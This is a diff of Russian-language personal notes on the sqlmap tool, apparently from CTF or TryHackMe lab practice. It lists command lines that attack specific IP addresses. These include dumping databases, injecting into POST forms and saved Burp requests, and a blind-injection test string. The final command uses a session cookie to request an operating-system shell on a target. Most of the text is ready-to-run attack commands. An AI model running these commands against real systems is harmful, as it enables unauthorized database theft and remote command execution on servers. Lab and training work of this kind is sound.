@@ -6,11 +6,16 @@
      Либо смотришь на колонки, если нужно определенные извлечь флагом --columns, после чего выбираешь колонку -C и дампишь выборочно.
 
 sqlmap -u <URL> --forms --batch --random-agent --dbs
+
 сканирование методом POST
+
 sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs --flush-session
+
 --flush-session     Flush session files for current target(сброс кеша)
+
 В Burp Copy to file запрос. в sqlmap -r файл с запросом -p параметр-уязвимый --затем опции. Пример с TryHackMe sqlmap -r req.txt -p blood_group --dbs.
 substring(database(),2,1)='B'
+
 https://tryhackme.com/room/sqlmap - пример использования с подгрузкой файла
 
 sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-agent --cookie='PHPSESSID=6et2iplhe59a7h6m2v55vjn49s' --os-shell
